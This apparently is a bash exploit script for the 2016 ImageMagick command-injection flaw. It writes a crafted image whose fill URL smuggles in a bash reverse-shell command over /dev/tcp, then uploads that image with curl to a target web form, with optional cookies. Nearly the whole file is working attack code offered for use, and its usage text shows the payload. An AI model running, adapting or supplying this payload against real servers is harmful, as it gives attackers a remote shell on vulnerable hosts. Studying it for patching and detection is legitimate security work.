#!/bin/bash
#
# ImageMagick Exp checking tools.
# author: 7ym0n.q6e/bb.qnyd@gmail.com
# github: https://github.com/7ym0n/security
# Copyleft (C) 2016 7ym0n.q6e.  All rights reserved.
#
# ImageMagick Exp is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ImageMagick Exp.  If not, see <http://www.gnu.org/licenses/>.
#

CURL=`which curl`
if [ "CURL" = "" ];then
	echo "Please install curl tool.";
fi
exp="exp.png"
EXP="push graphic-context\n\
viewbox 0 0 640 480\n\
fill 'url(https://example.com/image.jpg\"|/bin/bash -c \"bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\"\")'\n\
pop graphic-context"

help(){
	echo -e "\033[0;32mImageMagick Expolit:"
	echo -e "\033[0;32mUsage:	./exp.sh [HOST URL] [POST DATA] [COOKIE FILE]"
	echo -e "\033[0;32m	./exp.sh 'http://192.168.1.33/test.php' 'id=1&uname=test' /tmp/exp.cookie"
	echo -e "\033[0;31mPOC:\n"
	echo -e "\033[0;31m"$EXP"\n"
}

if [[ "$1" = "" && "$2" = "" ]];then
	help
	exit 1;
fi

if [[ "$1" = "help" || "$1" = "-h" || "$1" = "--help" ]];then
	help
	exit 1;
fi

host=`echo "$1" | grep -Pi '^http[s]?://.*'`
echo $host
if [ "$host" = "" ];then 
	help;
	exit 1;
fi

echo -e "\033[0;32mCreating PNG file..."
echo -e $EXP > $exp;

# split string and replace
data="-F \"$2\""
data=${data//&/\" -F \"}

#for element in $tmp   
#do  
#    data="${data} ${element}"  
#done 

# save cookie: -c /tmp/cookie$host
# using cookie: -b /tmp/cookie$host
if [ "$3" != "" ];then
	cookie="$3"
fi

echo -e "curl -k -H \"Expect:\" $data -F \"files=@$exp\" -b $cookie $host"
$(eval echo -e "curl -k -H \"Expect:\" $data -F \"files=@$exp\" -b $cookie $host")
rm -rfv $exp;
echo -e "Done\n:)..."
exit 0
